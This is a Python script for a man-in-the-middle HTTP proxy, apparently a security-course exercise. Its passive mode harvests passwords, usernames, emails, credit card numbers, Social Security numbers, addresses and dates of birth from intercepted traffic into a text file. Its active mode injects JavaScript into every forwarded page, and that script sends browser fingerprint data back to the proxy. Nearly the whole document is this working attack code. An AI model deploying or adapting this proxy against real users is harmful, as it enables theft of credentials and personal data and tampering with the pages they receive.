import socket
import argparse
import sys
import os
from urllib.parse import urlparse
import _thread
import re, cgi
import html

#using argparse to get terminal arguments
parser = argparse.ArgumentParser()
parser.add_argument('-m', help='passive or active modes available')
parser.add_argument('ip', type=str, help='ip to listen to')
parser.add_argument('port', type=int, help='port to listen to')
args = parser.parse_args()

#regular expressions used to search the GET request - first and last line
atSymbol = re.compile(r'\%40')
email = re.compile(r'email\=[a-zA-Z@.]+')
username = re.compile(r'username\=[a-zA-Z@.]+')
password = re.compile(r'password\=[a-zA-Z@.]+')
creditcard = re.compile(r'credit_card\=[0-9]{16}')
phonenumber = re.compile(r'phone=[0-9]{10}')


#used to clean up or modify simple text
tags = re.compile(r'(<!--.*?-->|<[^>]*>)')
amps = re.compile(r'\&amp\;nbsp\;')
space = re.compile(r'[\n][ ]+')
space2 = re.compile(r'[\n ]+')


#regular expressions used to search the plain text for sensitive data
labelnameSearch = re.compile(r'Name\:\s[a-zA-Z]\w+\s[a-zA-Z]\w+')
ssSearch = re.compile(r'[0-9]{4}\-?\s?[0-9]{4}\-?\s?[0-9]{4}\-?\s?[0-9]{4}')
ccNameSearch = re.compile(r'[a-bA-Z]\w+\s?([a-bA-Z]\w+\s)?([a-bA-Z]\w+\s)?')
ccNumberSearch = re.compile(r'[0-9]{4}\s?\-?[0-9]{4}\s?\-?[0-9]{4}\s?\-?[0-9]{4}')
dateOfBirthSearch = re.compile(r'Date of Birth\:\s[a-zA-Z]\w+\s\d\d?\,\s\d{4}')
addressSearch = re.compile(r'Address:\s\d+\s[a-zA-Z ,]+\d+')
phoneNumSearch = re.compile(r'Phone\s[(a-zA-Z)]+\:?\s[0-9-() ]+')
BIOSearch = re.compile(r'Bio\:?[a-zA-Z ,.]+')
nameAndSocial = re.compile(r'[a-zA-Z]+\s[a-zA-Z]+[\n ]+[0-9]{3}\-[0-9]{2}\-[0-9]{4}')
oneccName = re.compile(r'(Disc[a-zA-Z]+[\n ]+[0-9 -]+|JC[a-zA-Z]+[\n ]+[0-9 -]+|Master[a-zA-Z]+[\n ]+[0-9 -]+)')
twoccName = re.compile(r'[a-zA-Z]+\s[a-zA-Z]+[\n ]+[0-9 ]{16,}')
threeccName = re.compile(r'[a-zA-Z]+\s[a-zA-Z]+\s[a-zA-Z]+[\n ]+[0-9-]+')

#regular expression used to search query of injected
userAgentSearch = re.compile(r'user-agent=[a-zA-Z\/0-9.%(;_:)]+')
screenSearch = re.compile(r'screen=[0-9x]+')
languageSearch = re.compile(r'lang=[a-zA-Z-]+')


#javascript script for injection -- uses the ip of proxy as local
JsScript = '''
            <h3>
                <script>
                var txt = "http://127.0.0.1/?user-agent=";
                txt += navigator.userAgent;
                txt += "&screen=";
                txt += screen.width + "x" +screen.height;
                txt += "&lang=";
                txt +=  navigator.language;
                    var http = new XMLHttpRequest();
                    http.open("GET", txt, true);
                    http.send();
                </script>
            </h3>
           '''


def activeProxy(client_address, connection):

    loop = 1
    #open a file to write to
    file = open("info_2.txt", "w+")

    #set up port for http only
    port = 80

    #intercept the get request from user(browser) - Byte string
    getRequest = connection.recv(4096)
    #print(getRequest)

    #split the byte string into lines
    splitGetRequest = getRequest.splitlines()
    #first line of get request - used to get URL
    firstLine = splitGetRequest[0]
    #turn the first line into string
    firstLine = firstLine.decode('utf-8')
    #split the first string by spaces
    seperateGET = firstLine.split(' ')
    #get the url from the split
    completeURL = seperateGET[1]
    #use urlparse to parse the complete url
    URL = urlparse(completeURL)
    #print(URL)
    if(URL.netloc == "192.168.1.51"):
        #print(URL.query)
        useragent = userAgentSearch.findall(URL.query)
        screen = screenSearch.findall(URL.query)
        language = languageSearch.findall(URL.query)

        for u,s,l in zip(useragent, screen, language):
            #print(u,s,l)
            file.write(u+'\n'+s+'\n'+l)
        #file.write(URL.query)
        #print("JS script successful..teminating now")
        loop = 0

    else:
        #convert original request into string
        request = getRequest.decode('utf-8')
        #print(request)
        #replace the complete url with path for the GET portion
        fixedRequest = request.replace(completeURL, URL.path)
        #turn fixedRequest into byte string
        fixedRequest = fixedRequest.encode()
        #print(fixedRequest)
        #get the webServer from parsed URL
        webServer = URL.netloc
        #set the ip address of webServer
        wIP = socket.gethostbyname(webServer)

        #make socket and connect to webServer and send the fixedRequest
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((wIP, port))
        sock.send(fixedRequest)

        while True:
            #get the reply from the web server
            reply = sock.recv(4096)
            #print(reply)
            if(len(reply) > 0):
                listofLines = reply.decode('utf-8')
                #print(listofLines)
                newReply = listofLines + JsScript
                newReply = newReply.encode()
                #print(newReply)

                #foward information to user(browser)
                connection.send(newReply)

        sock.close()
        connection.close()






def passiveProxy(client_address, connection):

    #open a file to write to
    textFile = open("info_1.txt", "w+")
    #set up port for http only
    port = 80

    #intercept GET request from user(Browser) - Byte string
    getRequest = connection.recv(4096)
    print(getRequest)

    #split the byte string into lines
    splitGetRequest = getRequest.splitlines()
    #first line of get request - used to get URL
    firstLine = splitGetRequest[0]
    #get the last line of get Request - used to get cookies
    lastLine = splitGetRequest[-1]
    #turn the first line into string
    firstLine = firstLine.decode('utf-8')
    #turn the last line into string
    lastLine = lastLine.decode('utf-8')
    #split the first string by spaces
    seperateGET = firstLine.split(' ')
    #get the url from the split
    completeURL = seperateGET[1]
    #use urlparse to parse the complete url
    URL = urlparse(completeURL)
    #print(URL)
    #print(URL.query)

    #search for email, username, password, creditcard, and phonenumber in request last line - cookies
    headerInfo = atSymbol.sub('@', lastLine) #remove some characters and replace with @ character
    headerEmail = email.findall(headerInfo)
    headerUserName = username.findall(headerInfo)
    headerPassword = password.findall(headerInfo)
    headerCreditCard = creditcard.findall(headerInfo)
    headerPhoneNumber = phonenumber.findall(headerInfo)
    #print(headerInfo)

    #loop through all the found instances and save them to the open text file
    for(e, u, p, c, n) in zip(headerEmail, headerUserName, headerPassword, headerCreditCard, headerPhoneNumber):
        #print(e, u, p, c, n)
        textFile.write(e + '\n' + u + '\n' + p + '\n' + c + '\n' + n + '\n')

    #modify the URL query and search for email, user names, and passwords - parameters
    query = atSymbol.sub('@', URL.query) #remove some characters and replace with @ character
    print(query)
    eMail = email.findall(query)
    userName = username.findall(query)
    passWord = password.findall(query)

    #loop through all found instances and save them to the open text file
    for (e,u,p) in zip(eMail, userName, passWord):
        #print (e, u, p)
        textFile.write(e + '\n' + u + '\n' + p+'\n')

    #convert original request into string
    request = getRequest.decode('utf-8')
    #replace the complete url with path for the GET portion
    fixedRequest = request.replace(completeURL, URL.path)
    #turn fixedRequest into byte string
    fixedRequest = fixedRequest.encode()
    #get the webServer from parsed URL
    webServer = URL.netloc
    #set the ip address of webServer
    wIP = socket.gethostbyname(webServer)

    #make socket and connect to webServer and send the fixedRequest
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((wIP, port))
    sock.send(fixedRequest)

    while True:
        #get the reply from the web server
        reply = sock.recv(4096)
        #print(reply)
        if reply:
            textFile = open("info_1.txt", "a")
            #foward information to user(browser)
            connection.send(reply)

            #decode the reply into string
            text = reply.decode('utf-8')

            #clean up html file to be simple text
            removeTags = tags.sub('', text)
            simpleText = html.escape(removeTags)
            simpleText = amps.sub(' ', simpleText)
            #print(simpleText)

            #search for sensitive information in simple text
            names = labelnameSearch.findall(simpleText)
            ss = ssSearch.findall(simpleText)
            ccName = ccNameSearch.findall(simpleText)
            ccNum = ccNumberSearch.findall(simpleText)
            DOB = dateOfBirthSearch.findall(simpleText)
            addresses = addressSearch.findall(simpleText)
            phoneNumbers = phoneNumSearch.findall(simpleText)
            bio = BIOSearch.findall(simpleText)
            nameSocial = nameAndSocial.findall(simpleText)
            ccNameOne = oneccName.findall(simpleText)
            ccNameTwo = twoccName.findall(simpleText)
            ccNameThree = threeccName.findall(simpleText)

            # names = nameSearch.findall(simpleText)
            for n in names:
                #print(n)
                textFile.write(n + '\n')
            # DOB = dateOfBirthSearch.findall(simpleText)
            for i in DOB:
                #print(i)
                textFile.write(i+ '\n')
            # addresses = addressSearch.findall(simpleText)
            for a in addresses:
                #print(a)
                textFile.write(a+'\n')
            #phoneNumbers = phoneNumSearch.findall(simpleText)
            for p in phoneNumbers:
                #print(p)
                textFile.write(p+'\n')
            # bio = BIOSearch.findall(simpleText)
            for b in bio:
                #print (b)
                textFile.write(b+'\n')

            for n in nameSocial:
                #print(n)
                i = space.sub(' ', n)
                #print(i)
                textFile.write(i+'\n')

            for one in ccNameOne:
                #print(one)
                i = space2.sub(' ', one)
                #print(i)
                textFile.write(i+'\n')

            for two in ccNameTwo:
                #print(two)
                i = space2.sub(' ', two)
                #print(i)
                textFile.write(i+'\n')

            for three in ccNameThree:
                #print(three)
                i = space2.sub(' ', three)
                #print(i)
                textFile.write(i+'\n')
            textFile.close()




def main():
    print(args.m)
    print(args.ip)
    print(args.port)

    #create a socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #bind socket to port and specific interface
    sock.bind((args.ip, args.port))
    #begin to list for connections --enables server to accept connections
    sock.listen()
    #sock.settimeout(20)


    while True:
        try:
            connection, client_address = sock.accept()
            if(args.m == "passive"):
                _thread.start_new_thread(passiveProxy, (client_address, connection) )
            elif(args.m == "active"):
                _thread.start_new_thread(activeProxy, (client_address, connection))
        except socket.timeout:
            break
    sock.close()
    connection.close()


if __name__ == '__main__':
    main()
